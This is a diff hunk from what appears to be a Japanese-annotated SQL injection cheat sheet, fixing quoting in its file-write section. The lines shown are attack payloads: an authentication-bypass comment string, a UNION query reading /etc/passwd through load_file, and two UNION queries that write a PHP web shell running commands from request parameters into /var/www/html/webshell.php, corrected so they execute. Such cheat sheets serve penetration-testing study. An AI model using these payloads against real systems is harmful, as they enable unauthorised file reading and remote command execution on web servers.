@@ -49,8 +49,8 @@ admin'-- -
 # ファイル読み込み
 ' UNOIN SELECT null,load_file('/etc/passwd'),null,null-- -
 # ファイル書き込み
-' UNION SELECT null,'<?php system($_GET["cmd"]);?>',null,null INTO OUTFILE /var/www/html/webshell.php-- -
-' UNION SELECT null,'<?php system($_REQUEST["cmd"]);?>',null,null INTO OUTFILE /var/www/html/webshell.php-- -
+' UNION SELECT null,'<?php system($_GET["cmd"]);?>',null,null INTO OUTFILE '/var/www/html/webshell.php'-- -
+' UNION SELECT null,'<?php system($_REQUEST["cmd"]);?>',null,null INTO OUTFILE '/var/www/html/webshell.php'-- -
 ```
 
 ## PostgreSQLで使用できるクエリ
